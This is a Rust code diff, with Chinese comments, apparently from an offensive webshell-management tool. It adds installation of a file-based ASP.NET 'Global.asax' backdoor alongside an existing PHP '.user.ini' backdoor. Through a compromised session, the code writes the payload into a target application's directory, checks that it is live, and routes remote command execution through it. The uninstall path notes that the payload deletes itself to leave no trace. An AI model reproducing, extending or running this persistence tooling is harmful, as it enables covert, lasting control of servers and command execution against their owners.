@@ -3931,6 +3931,7 @@ pub async fn memshell_capabilities(
             sessions.get_mut(&session_id)?.info.clone()
         };
         let verdict = crate::memshell::php_user_ini_preconditions(&info);
+        let aspx_verdict = crate::memshell::aspx::preconditions(&info);
         Ok(vec![
             MemshellCapability {
                 kind: crate::memshell::KIND_PHP_USER_INI.to_string(),
@@ -3945,6 +3946,13 @@ pub async fn memshell_capabilities(
                 runtime: "php".to_string(),
                 feasible: true,
                 reason: None,
+            },
+            // ASP.NET：文件型持久化（非内存马），仅在 ASP.NET/IIS 目标上有意义
+            MemshellCapability {
+                kind: crate::memshell::KIND_ASPNET_GLOBAL.to_string(),
+                runtime: "aspx".to_string(),
+                feasible: aspx_verdict.is_ok(),
+                reason: aspx_verdict.err(),
             },
         ])
     })
@@ -4057,7 +4065,7 @@ pub async fn memshell_install(
             )
             .map_err(|error| format!("注入失败：{error}"))?;
             let alive =
-                crate::memshell::php::check(&ctx.settings, trigger, &token, &name);
+                crate::memshell::check(&ctx.settings, trigger, &token, &name);
             MemoryShell {
                 id: uuid::Uuid::new_v4().to_string(),
                 workspace_id: workspace_id.clone(),
@@ -4079,6 +4087,62 @@ pub async fn memshell_install(
                 } else {
                     "尚未生效：目标 PHP 会缓存 .user.ini（user_ini.cache_ttl，默认 300s），请稍后重试检测"
                         .to_string()
+                },
+            }
+        } else if kind == crate::memshell::KIND_ASPNET_GLOBAL {
+            crate::memshell::aspx::preconditions(&info)?;
+            let dir = install_dir
+                .as_deref()
+                .map(str::trim)
+                .filter(|value| !value.is_empty())
+                .ok_or_else(|| "缺少应用根目录".to_string())?;
+            let trigger = trigger_url
+                .as_deref()
+                .map(str::trim)
+                .filter(|value| !value.is_empty())
+                .ok_or_else(|| "缺少触发 URL（应用下任意可访问地址即可，Global.asax 每次请求都会执行）".to_string())?;
+            let path = crate::memshell::aspx::asax_path(dir);
+            // 覆盖应用自身的 Global.asax 会直接毁掉目标应用：先列举目录确认。
+            // 列举失败也中止 —— 宁可装不上，也不猜。
+            let listing = ctx
+                .protocol
+                .list_dir(session.as_ref(), dir, &ctx.settings)
+                .map_err(|error| format!("无法确认目标是否已有 Global.asax，已中止：{error}"))?;
+            if listing
+                .entries
+                .iter()
+                .any(|entry| !entry.is_dir && entry.name.eq_ignore_ascii_case("Global.asax"))
+            {
+                return Err(
+                    "目标应用已存在 Global.asax（通常是应用自身入口），覆盖会破坏应用；已中止"
+                        .to_string(),
+                );
+            }
+            let payload = crate::memshell::aspx::build_payload(&token, &name);
+            ctx.protocol
+                .write_file(session.as_ref(), &path, payload.as_bytes(), &ctx.settings)
+                .map_err(|error| format!("写入 Global.asax 失败：{error}"))?;
+            let alive = crate::memshell::check(&ctx.settings, trigger, &token, &name);
+            MemoryShell {
+                id: uuid::Uuid::new_v4().to_string(),
+                workspace_id: workspace_id.clone(),
+                shell_id: Some(shell_id.clone()),
+                runtime: "aspx".to_string(),
+                kind: crate::memshell::KIND_ASPNET_GLOBAL.to_string(),
+                name,
+                token,
+                endpoint: trigger.to_string(),
+                install_path: path.clone(),
+                artifact: serde_json::json!({ "path": path }).to_string(),
+                status: if alive { "active" } else { "pending" }.to_string(),
+                installed_at: now.clone(),
+                last_check_at: if alive { Some(now) } else { None },
+                last_check_ok: alive,
+                uninstall_attempts: 0,
+                notes: if alive {
+                    "文件型持久化（非内存马）；**未经 IIS 实机验证**，请在测试环境确认".to_string()
+                } else {
+                    "尚未生效：首次请求会触发 ASP.NET 编译 Global.asax，可稍后重试检测".to_string()
                 },
             }
         } else {
@@ -4140,7 +4204,7 @@ pub async fn memshell_check(handle_id: String, app: AppHandle) -> Result<bool, S
                 &handle.name,
             )
         } else {
-            crate::memshell::php::check(&settings, &handle.endpoint, &handle.token, &handle.name)
+            crate::memshell::check(&settings, &handle.endpoint, &handle.token, &handle.name)
         };
         let status = if alive {
             "active".to_string()
@@ -4216,11 +4280,26 @@ pub async fn memshell_uninstall(handle_id: String, app: AppHandle) -> Result<Str
         }
 
         let outcome =
-            crate::memshell::php::uninstall_via_payload(&settings, &handle.endpoint, &handle.token);
+            crate::memshell::uninstall_via_payload(&settings, &handle.endpoint, &handle.token);
         match outcome {
             Ok(()) => {
+                // ASP.NET 形态的载荷会**删除自身**（应用域随即重启），目标上无残留；
+                // PHP 形态只是中和（缓存窗口内不能删文件）。两者状态不同。
+                let (status, message) = if handle.kind == crate::memshell::KIND_ASPNET_GLOBAL {
+                    (
+                        "uninstalled",
+                        "Global.asax 已自删（ASP.NET 检测到文件变化会重启应用域），目标上无残留"
+                            .to_string(),
+                    )
+                } else {
+                    (
+                        "neutered",
+                        "载荷已中和；为免目标站点在缓存窗口内 500，文件暂留，请在 TTL 后清理"
+                            .to_string(),
+                    )
+                };
                 database
-                    .update_memory_shell_check(&handle.id, "neutered", false)
+                    .update_memory_shell_check(&handle.id, status, false)
                     .map_err(|error| error.to_string())?;
                 database
                     .record_audit(
@@ -4228,16 +4307,10 @@ pub async fn memshell_uninstall(handle_id: String, app: AppHandle) -> Result<Str
                         handle.shell_id.as_deref(),
                         "memshell.uninstall",
                         "success",
-                        &format!(
-                            "句柄：{}；载荷已中和，待 user_ini.cache_ttl 过后可删除 {}",
-                            handle.id, handle.install_path
-                        ),
+                        &format!("句柄：{}；{message}", handle.id),
                     )
                     .map_err(|error| error.to_string())?;
-                Ok(
-                    "载荷已中和；为免目标站点在缓存窗口内 500，文件暂留，请在 TTL 后清理"
-                        .to_string(),
-                )
+                Ok(message)
             }
             Err(error) => {
                 database
@@ -4311,7 +4384,7 @@ pub async fn memshell_exec(
                 &command,
             )?
         } else {
-            crate::memshell::php::exec(&settings, &handle.endpoint, &handle.token, &command)?
+            crate::memshell::exec(&settings, &handle.endpoint, &handle.token, &command)?
         };
         state
             .database
